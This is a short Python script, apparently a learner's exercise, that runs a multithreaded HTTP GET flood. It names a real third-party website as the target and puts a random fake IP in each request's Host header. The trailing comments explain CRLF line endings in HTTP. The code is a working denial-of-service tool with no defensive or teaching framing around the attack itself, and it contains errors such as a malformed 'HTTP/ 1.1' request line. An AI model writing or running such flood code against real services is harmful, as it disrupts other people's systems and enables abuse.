import socket
import threading
from random import randint #radint = random int

target = 'www.google.com'
# fake_ip = '10.0.0.1'
port = 80

def random_ip_gen():
    # Generate random values for each part
    part = [randint(0, 255) for _ in range(4)]
    # Format the IP address into 1
    ip_address = ".".join(map(str, part))
    return ip_address

def http_flood():
    x=1
    while True:
        fake_ip = random_ip_gen()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/ 1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        print(f"send to {target} repeat {x}")
        x += 1
        s.close()
        
for i in range(5):
    t = threading.Thread(target=http_flood)
    t.start()
    
# \r: Carriage Return
# The carriage return character (ASCII code 13) is represented as \r.
# \n: Line Feed
# The line feed character (ASCII code 10) is represented as \n.
# \r\n: Carriage Return and Line Feed
# Together, \r\n represents the end-of-line sequence in various network protocols, including HTTP
# Double \r\n\r\n: End of HTTP Headers
# In the context of HTTP, two consecutive \r\n sequences (\r\n\r\n) indicate the end of the HTTP headers in a request or response.
# After the headers, the actual content (such as the body of an HTTP POST request or the body of an HTTP response) may follow.